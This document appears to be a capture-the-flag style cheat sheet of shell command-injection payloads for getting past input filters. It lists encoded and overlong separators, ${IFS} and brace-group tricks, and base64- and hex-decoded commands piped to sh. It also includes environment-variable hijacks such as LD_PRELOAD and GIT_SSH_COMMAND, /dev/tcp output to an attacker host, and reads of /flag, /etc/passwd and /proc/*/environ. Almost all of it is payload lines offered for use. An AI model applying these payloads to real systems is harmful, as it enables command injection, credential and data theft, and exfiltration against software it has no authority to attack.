# Extended Corpus — the edge cases and exotic shapes

## The exotic separators — beyond `;` `&` `|`

```
%0a                 — newline — survives ;-filters
%0d                 — carriage return
%0d%0a              — CRLF
%09                 — tab — word-splitter
%0b                 — vertical tab (some parsers)
%0c                 — form feed
%85                 — NEL
%u2028              — line separator (unicode)
%u2029              — paragraph separator
%ef%bf%bd           — U+FFFD replacement
%ff                 — raw 0xFF
%00                 — null — string-terminator in some langs
;&                  — case-terminator — if the arg lands inside case
;;&                 — case-terminator
|&                  — pipe stdout+stderr
${IFS}              — the expansion-space
%24%7BIFS%7D        — encoded ${IFS}
$IFS$9              — alternate
$IFS$1
${IFS}${PATH:0:1}   — expansion-space + slash
{cmd,arg}           — brace-group — {cat,/flag}
{cat,/flag,}
{cat,/etc/passwd}
{cat,/flag;id;}     — brace-group + inner-sep
<cmd                — stdin-from-command? no — <file is stdin
>file               — write
cmd>file
cmd>>file
cmd<file
cmd2>file
cmd&>file
cmd<>file
exec<>&3            — fd-juggle
$(cmd)
`cmd`
((x))               — arithmetic — eval-adjacent
```

## The exotic expansions — `${...}` deep

```
${x} ${x:-d} ${x:=d} ${x:+d} ${x:?e} ${x#p} ${x##p} ${x%p} ${x%%p}
${x/p/r} ${x//p/r} ${x/#p/r} ${x/%p/r} ${x:off:len} ${x^} ${x^^} ${x,} ${x,,}
${!x} ${!x@} ${!x*} ${!x[*]} ${!x[@]} ${!x#} ${!x[@]#} ${!x[@]%} ${!x[@]/}
${#x} ${#x[@]} ${#x[*]} ${#} ${#$} ${#-} ${#0} ${#1} ${#?} ${#!} ${#@} ${#*}
${x@Q} ${x@E} ${x@P} ${x@A} ${x@K} ${x@a} ${x@k}
${x:x:y} ${x/y/z} ${x//y/z} ${x/#y/z} ${x/%y/z} ${x#y} ${x##y} ${x%y} ${x%%y}
```

Each is a byte-fishing or construction path — `variable-tricks.md`.

## The exotic quoting — `$'..'` ANSI-C

```
$'\x69\x64'            — 'id'
$'\151\144'            — 'id' octal
$'\u0069\u0064'        — 'id' unicode
$'\x63\x61\x74 /flag'  — 'cat /flag'
$'x\ny'                — embedded \n
$'x\x3bid'             — 'x;id' — the ; inside $'..'
```

## The exotic exec — builtins people forget

```
eval id          — eval builtin
exec id          — exec builtin
. /tmp/x         — source
source /tmp/x    — source
builtin id       — force-builtin
command id       — force-external
enable -f /tmp/x x  — load a builtin
compgen -c id    — completion
compgen -A builtin id
mapfile -t x < /tmp/f   — read file into array
read -r x < /tmp/f      — read file
readarray x < /tmp/f
history -r /tmp/f       — read history file
fc -s 'id'              — history-exec
fc 0                    — rerun
set -o xtrace; PS4='$(id)'  — xtrace-prefix injection
set -o functrace; trap 'id' DEBUG   — debug-trap
trap 'id' EXIT          — exit-trap
trap 'id' ERR           — err-trap
trap 'id' DEBUG         — debug-trap
ulimit -c unlimited; kill -SEGV $$  — core-dump
kill -s USR1 $$          — signal-self
```

## The exotic pipes/redirections — `redirection-tricks.md` depth

```
x | tee /tmp/o
x | tee -a /tmp/o
x |& tee /tmp/o
x > >(tee /tmp/o)      — process-sub
x 2> >(tee /tmp/o)
x | xargs tee -a /tmp/o
x | dd of=/tmp/o
x | install /dev/stdin /tmp/o
x | rsync /dev/stdin /tmp/o
x | socat - /tmp/o
x | nc -l -p 80 >/tmp/o
x > /dev/tcp/YOU/PORT     — bash tcp-write
x < /dev/tcp/YOU/PORT     — bash tcp-read
x > /dev/udp/YOU/PORT     — bash udp
x <&3 3<>/tmp/f           — fd juggling
exec 3<>/tmp/f; x >&3
mkfifo /tmp/f; x > /tmp/f < /tmp/f
```

## The exotic encodings — `encoding.md` depth

```
%x                  — literal-percent bytes
%uXXXX              — unicode — %u003B=;
%ef%bc%9b           — fullwidth ;
%c0%bb              — overlong ;
%e0%80%bb           — 3-byte overlong ;
%f0%80%80%bb        — 4-byte overlong ;
%25%33%42           — double-encoded ;
%252533%3242        — triple-encoded ;
${IFS}              — the expansion-space
\x3b                — $'..' escape
\u003b              — $'..' unicode-escape
%3f%3f%3f           — ??? encoded
```

## The exotic command-name variants — `keyword-filter.md` depth

```
c'a't c"a"t c\at c$@at ca$@t $'c''a''t' $'ca'"t" $'cat'
/bin/c?t /???/cat /???/c?t /?in/cat /bin?/cat
c$()at c$(x)at ca${x}t c${x}at ${x}at
f=/bin/cat;$f /flag
x=ca;$x"t" /flag
a=cat;b=/flag;$a$b;$a $b
echo 636174|xxd -r -p|sh
echo Y2F0|base64 -d|sh
echo '63617420'|xxd -r -p
$(echo Y2F0|base64 -d)
$(printf '\x63\x61\x74')
$(echo '636174'|xxd -r -p)
$(od -A n -t x1|tr -d ' ')
```

## The exotic `/`/`:`/`.`-blocked paths

```
. /flag              — source — if `/` allowed in arg
. ${PWD}/flag        — source with var
. ${PWD%/*}/flag     — parent-dir var
cd /;cat flag
cd flagdir;cat flag
${HOME}/flag
${PWD}/flag
${OLDPWD}/flag
${SHELL:0:1}flag
${PATH:0:1}flag
${0:0:1}flag
${SHELL%%sh}         — /bin (SHELL=/bin/sh→/bin/)
${SHELL%/*}          — /bin
${PWD%/*}            — parent
```

## The exotic env tricks — `env-var-injection.md` depth

```
BASH_ENV=/tmp/x bash
ENV=/tmp/x sh
SHELLOPTS=xtrace PS4='$(id)' bash
PROMPT_COMMAND=id bash
PROMPT_COMMAND='id' bash -i
LD_PRELOAD=/tmp/x.so id
LD_LIBRARY_PATH=/tmp id
LD_AUDIT=/tmp/x.so id
LD_DEBUG=all id
LD_PROFILE=x /bin/id
PATH=/tmp id              — PATH-hijack
IFS=,:x id                — IFS-trick
GLOBIGNORE='*';id         — glob-ignore
PERL5OPT='-M/tmp/x' perl
RUBYOPT='-r/tmp/x' ruby
NODE_OPTIONS='--require /tmp/x' node
PYTHONSTARTUP=/tmp/x python
PYTHONPATH=/tmp python
PYTHONWARNINGS='all:0:antigravity:0:0' python
PHPRC=/tmp php             — php.ini-path
PHP_INI_SCAN_DIR=/tmp php
COMPOSER_HOME=/tmp composer
GIT_CONFIG_GLOBAL=/tmp git
GIT_SSH_COMMAND='id' git fetch
GIT_EXTERNAL_DIFF='id' git diff
PAGER='id' git log
LESSOPEN='|id' less x
LESSCLOSE='|id' less x
EDITOR='id' git commit
VISUAL='id' less
TERMCAP='...|id' less    — termcap-injection
```

## The exotic subshell/grouping

```
(id;id)
{id;id;}
{ id;id; }
x(id)      — function-call — defines x then... no, defines function x
x(){id;};x — define+call
f(){id;};f
alias x=id;x
shopt -s expand_aliases;alias x=id;x
eval 'id'
eval $'id'
eval $(echo id)
eval `echo id`
builtin eval id
enable -n echo;id
```

## The exotic process-substitution

```
id > >(cat)              — stdout to process-sub
id 2> >(cat)             — stderr to process-sub
x <(id)                  — process-sub as file-arg
diff <(id) /tmp/f
cat <(id)
. <(id)                  — source process-sub
source <(id)
tee >(id)                — tee to command
>(id)                    — process-sub standalone
<(id)
```

## The exotic test/condition forms

```
[ -f /flag ] && id
[[ -f /flag ]] && id
test -f /flag && id
(( 1 )) && id
if [ -f /flag ];then id;fi
if test -f /flag;then id;fi
[ 1 ] || id
[ ! -f /flag ] || id
[ -f /flag ]&&id||echo no
while id;do :;done        — loop-exec
until id;do :;done
for x in id;do $x;done
for x in 'id';do eval $x;done
case 1 in 1)id;;esac
select x in id;do $x;done
read x<<<id;$x
```

## The exotic integer/arithmetic channels

```
$((`id|wc -c`))          — output-length as number
x=$((`id|wc -c`));echo $x
sleep$((`cat /flag|wc -c`))  — flag-length as sleep
[ `id|wc -c` -gt 5 ]&&id
```

## The exotic signal/trap/exec flows

```
trap 'id' EXIT
trap 'id' ERR
trap 'id' DEBUG
trap 'id' RETURN
trap 'id' 0 1 2 3
set -o functrace;trap 'id' DEBUG
shopt -s extdebug;trap 'id' DEBUG
exec 3<>/tmp/f;id>&3
eval 'id' 2>/dev/null
```

## The exotic argv0 tricks

```
bash -c 'exec -a id x'   — set argv0
exec -a /tmp/x bash      — argv0 control
```

## The "the shell runs but output is filtered" shapes

```
id|base64                 — encode output
id|xxd -p                 — hex output
id|od -A n -t x1          — octal-dump
id|tr a-z A-Z             — translate
id|sed 's/x/y/'           — modify
id|awk '{print NR,$0}'    — number the lines
id|grep -o 'f.*'          — filter
id|cut -d: -f1            — split
id|sort|uniq -c           — order
id|wc -c                  — length only
id|md5sum                 — hash — the flag's hash? verify
id|sha256sum
id|cksum
id|sum
id|gzip|xxd
id|zlib-flate -compress|xxd
```

## The exotic "the flag is in a place cat can't read" — output-modification

```
cat /flag 2>/dev/null || ls -la /flag* /root/ /etc/ 2>/dev/null
cat /flag 2>&1 || sudo -l
cat /flag* /etc/flag* /root/*flag* 2>/dev/null
strings /bin/* | grep flag
strings $(which *) 2>/dev/null | grep flag
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i flag
```

## The exotic write/read pairs — file-write then fetch

```
echo x>/tmp/o            — write then ?f=/tmp/o
printf %s x>/tmp/o
echo -e 'x\ny'|tee /tmp/o
cp /flag /tmp/o
dd if=/flag of=/tmp/o
install /flag /tmp/o
rsync /flag /tmp/o
tar cf /tmp/x /flag;tar xf /tmp/x -O
unzip -p x.zip /flag>/tmp/o
```

## The "the last resort" — the everything-blocked table

```
${PATH:0:1}        — /
${HOME:0:1}
${PWD:0:1}
${0:0:1}
${SHELL:0:1}
~
$0
$* $@ $# $- $$ $? $!
<file
>file
* ? [...]
{cmd,arg}
printf %s x
$(<file)
xargs < file
tr A a < file
sort < file
${x:0:1}
${x%/*}
${x##*/}
$(printf '\x69\x64')
$'\x69\x64'
```

## Output to record

- which exotic form bypassed the filter + the verbatim output
